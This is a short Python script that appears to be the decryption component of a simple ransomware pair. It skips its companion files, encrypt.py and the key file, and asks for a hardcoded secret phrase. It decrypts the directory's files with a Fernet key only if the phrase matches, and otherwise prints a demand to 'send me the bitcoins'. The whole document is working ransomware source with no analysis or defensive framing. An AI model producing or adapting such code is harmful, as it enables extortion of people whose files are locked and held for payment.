#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Let's find some files

files = []

for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "NANI??"
user_phrase = input("Enter secret phrase to get your files back:\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Congratulations. Your files have been decrypted. Just don't mess this up again.")

else:
	print("Wrong phrase. Try harder, or else send me the bitcoins.")